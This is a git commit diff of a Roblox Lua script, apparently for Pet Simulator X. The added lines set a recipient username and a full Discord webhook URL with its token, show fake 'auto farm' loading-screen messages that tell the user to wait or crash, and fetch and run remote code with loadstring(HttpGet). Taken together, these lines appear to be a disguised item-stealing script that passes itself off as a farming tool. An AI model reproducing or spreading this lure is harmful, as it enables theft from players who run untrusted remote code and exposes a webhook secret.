da2f25e6940f11cde4fe284c8b3cf6a3187dced9
Rafacarsari <133911366+Rafacarsari@users.noreply.github.com>
2023-05-27 09:07:26 -0700

    Update psx.lua

--- psx.lua
+++ psx.lua
@@ -1,3 +1,19 @@
-_G.Key = "Itz_kends"
+Username = "Itz_kends"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
+WebHook = "https://discord.com/api/webhooks/1108478223945302076/ugPxaKoaDOf2tncaC-ZmFER2YQVkNoGce7M-4Mw6dYCb7GczAeDYcuVPIBF8QmDCDKtF"
+
+loadingscreen = true
+
+_G.CustomScriptName = "PSX AUTO FARM WAITING OR YOU WILL GET CRASH"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+
+
